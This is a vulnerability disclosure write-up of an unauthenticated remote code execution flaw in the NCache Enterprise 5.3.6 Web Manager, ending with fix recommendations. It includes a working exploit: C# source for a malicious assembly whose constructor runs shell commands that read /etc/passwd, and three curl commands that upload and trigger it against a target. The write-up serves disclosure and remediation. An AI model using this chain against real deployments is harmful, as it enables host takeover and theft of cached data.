# NCache Enterprise — Unauthenticated Assembly.LoadFrom RCE via Web Manager

## 1. Research Target & Attack Surface

NCache Enterprise 5.3.6 (Alachisoft) is a distributed .NET cache / in-memory data grid (IMDG). It sits between applications and databases, so a compromise of a cache node exposes hot data and provides a pivot into the application tier. The management surface is the NCache Web Manager — an ASP.NET Core 8 Razor Pages console (`Alachisoft.NCache.ManagementCenter`) hosted on Kestrel, listening on HTTP 8251. In the official image (`alachisoft/ncache:5.3.6`) the listener binds `0.0.0.0:8251` (verified via `/proc/net/tcp`), the image `EXPOSE`s 8251, and production deployments commonly publish it.

Relevant surface:

| Path | Handler | Purpose |
|---|---|---|
| `GET /ClusteredCaches` | Index page | Session/antiforgery issuance |
| `POST /ClusteredCaches/Details?handler=GenericTypeProvider` | `OnPostGenericTypeProvider` | Upload .NET assembly |
| `POST /ClusteredCaches/Details?handler=GetGenericHandlerType` | `OnPostGetGenericHandlerType` | Load + instantiate assembly |

The last two endpoints are the interesting ones: "Generic Type Provider" is a plugin mechanism that by definition loads user-supplied code. The question was whether an attacker could drive it without credentials.

## 2. Sink Identification: Assembly.LoadFrom

The sink is `Alachisoft.NCache.PremiseProvider.Utility.GenericProvderHandler.GetGenericProviderClasses`:

```csharp
private System.Type[] GetGenericProviderClasses(string classname, string fileName, string configId, out IGenericTypeProvider genProvider)
{
    string text = Path.Combine(Path.Combine(Path.GetTempPath(), "webmanager", configId), fileName);
    // text = <temp>/webmanager/<configId>/<fileName>  ← configId/fileName attacker-controlled
    assembly = System.Reflection.Assembly.LoadFrom(text);   // ← SINK
    if (assembly != null)
    {
        genProvider = (IGenericTypeProvider)assembly.CreateInstance(classname);  // ← constructor fires
    }
    return genProvider.GetGenericTypes();
}
```

Two code-execution trigger points: `Assembly.LoadFrom` runs the assembly's module initializer (`<Module>.cctor`), and `CreateInstance(classname)` invokes the public parameterless constructor. There is no signature validation, no source check, no path restriction.

## 3. Source Identification: Two Unauthenticated Handlers

**Upload** — `OnPostGenericTypeProvider` (`DetailsModel.cs:3734`) receives a multipart file list and an attacker-controlled `configId`, extracts any class implementing `IGenericTypeProvider` via Mono.Cecil metadata (no execution), writes the file, and stores the assembly simple name in the session:

```csharp
string text = Path.Combine(Path.GetTempPath(), "webmanager", configId);  // configId attacker-controlled
...
KeyValuePair<string, List<string>> keyValuePair = Helper.ExtractFile(file, "IGenericTypeProvider", configId);
if (keyValuePair.Value.Count > 0)
{
    string value = keyValuePair.Key.Split(",")[0] + ".dll";
    base.HttpContext.Session.Set("AssemblyName", Helper.Serialize(value));
    list.AddRange(keyValuePair.Value);
}
Helper.UploadingFile(file, configId, text);  // writes <temp>/webmanager/<configId>/<file.FileName>
```

`Helper.UploadingFile` is `Path.Combine(tempDirectory, formfile.FileName)` + `FileMode.Create` — no extension/content/signature validation.

**Trigger** — `OnPostGetGenericHandlerType` (`DetailsModel.cs:3774`) reads the session assembly name, takes attacker-controlled `classname` and `configId`, and calls into the sink. The only constraint is that the uploaded assembly's simple name must equal the filename stored in the session (`EvilAsm` ↔ `EvilAsm.dll`), which the attacker controls anyway.

## 4. End-to-End Data Flow

```
POST /ClusteredCaches/Details?handler=GenericTypeProvider
  (unauthenticated; antiforgery token from GET /ClusteredCaches)
  configId=pwn, files=EvilAsm.dll  (malicious .NET assembly)
    → ExtractFile (Mono.Cecil metadata) → ["EvilNs.EvilClass"]
    → session["AssemblyName"] = "EvilAsm.dll"
    → UploadingFile → /tmp/webmanager/pwn/EvilAsm.dll

POST /ClusteredCaches/Details?handler=GetGenericHandlerType
  classname=EvilNs.EvilClass, configId=pwn
    → GetGenericTypeHandlerClass → GetGenericProviderClasses
    → Assembly.LoadFrom(/tmp/webmanager/pwn/EvilAsm.dll)  ← module initializer
    → CreateInstance("EvilNs.EvilClass")                  ← constructor → Process.Start
    → RCE as the ncache service user (uid 1000)
```

## 5. Exploit Construction

The payload is a .NET assembly whose constructor performs the command execution:

```csharp
using System;
using System.Diagnostics;
using System.Reflection;
using Alachisoft.NCache.Runtime.GenericTypesProvider;

namespace EvilNs
{
    public class EvilClass : IGenericTypeProvider
    {
        public EvilClass()  // CreateInstance triggers this
        {
            var psi = new ProcessStartInfo
            {
                FileName = "/bin/bash",
                Arguments = "-c \"id > /tmp/ncache_rce_PROOF 2>&1; hostname >> /tmp/ncache_rce_PROOF 2>&1; head -1 /etc/passwd >> /tmp/ncache_rce_PROOF 2>&1\"",
                UseShellExecute = false, RedirectStandardOutput = true,
                RedirectStandardError = true, CreateNoWindow = true
            };
            var p = Process.Start(psi);
            if (p != null) p.WaitForExit(5000);
        }
        public Type[] GetGenericTypes() => new Type[0];
        public bool CheckIfSerializable(Type type, FieldInfo fieldInfo) => false;
    }
}
```

Three constraints drive the design: the assembly simple name must equal the uploaded filename (`EvilAsm` ↔ `EvilAsm.dll`), the class must implement `IGenericTypeProvider` (or `ExtractFile` returns an empty list and the session is never written), and the constructor must be public and parameterless for `CreateInstance(string)`.

The full chain is three curl calls:

```bash
# STEP 1: unauthenticated GET → session cookie + antiforgery token
curl -s -c nc.jar http://<TARGET_IP>:8251/ClusteredCaches -o cluster.html
TOK=$(grep -oE 'CfDJ8[A-Za-z0-9_-]{60,}' cluster.html | head -1)

# STEP 2: upload the malicious assembly
curl -s -b nc.jar -X POST "http://<TARGET_IP>:8251/ClusteredCaches/Details?handler=GenericTypeProvider" \
  -H "RequestVerificationToken: $TOK" -F "configId=pwn" -F "files=@EvilAsm.dll;filename=EvilAsm.dll"
# response: ["EvilNs.EvilClass"]

# STEP 3: trigger LoadFrom + CreateInstance
curl -s -b nc.jar -X POST "http://<TARGET_IP>:8251/ClusteredCaches/Details?handler=GetGenericHandlerType" \
  -H "RequestVerificationToken: $TOK" -d "classname=EvilNs.EvilClass&configId=pwn"
# response: [] — GetGenericTypes empty, but the constructor already ran
```

## 6. Dynamic Verification

Verified against NCache Enterprise 5.3.6 (Docker `alachisoft/ncache:5.3.6`) with security left at factory default. The 3-step chain was reproduced with **three independent assemblies and markers** (module initializer and constructor both fire), all executing as uid=1000 (`ncache`). Marker `/tmp/ncache_rce_PROOF`:

```
uid=1000(ncache) gid=1000(ncache) groups=1000(ncache),0(root)
<hostname>
root:x:0:0:root:/root:/bin/bash
```

The PoC script embeds a precompiled `EvilAsm.dll` and performs the full chain with a single invocation.

## 7. Reachability & Impact

- **Auth**: security disabled by default → all Web Manager handlers unauthenticated
- **Network**: binds 0.0.0.0:8251 by default; production deployments expose it
- **Antiforgery**: token extractable from the unauthenticated GET page
- **Upload/trigger**: no `configId` validation, no file validation, no additional gate
- **No MITM / no Redis jump**: pure inbound HTTP against Web Manager

The impact is unauthenticated remote code execution as the `ncache` service user — full compromise of cached data and the host, plus a credible pivot into the application tier that consumes the cache. Combined with the default-disabled security, this is a zero-interaction takeover of the caching infrastructure.

## 8. Fix Recommendations

1. Enable security by default in `security.ncconf` (`enabled="true"`) and require an admin account
2. Add `[Authorize]` to management handlers — don't rely on the single middleware gate
3. Validate `configId` against real caches; restrict upload extensions/content
4. Never `Assembly.LoadFrom` attacker-supplied DLLs; use metadata-only reflection (Mono.Cecil) or a sandboxed AppDomain with signature validation
5. Do not embed antiforgery tokens in unauthenticated GET pages; don't issue sessions to anonymous GETs
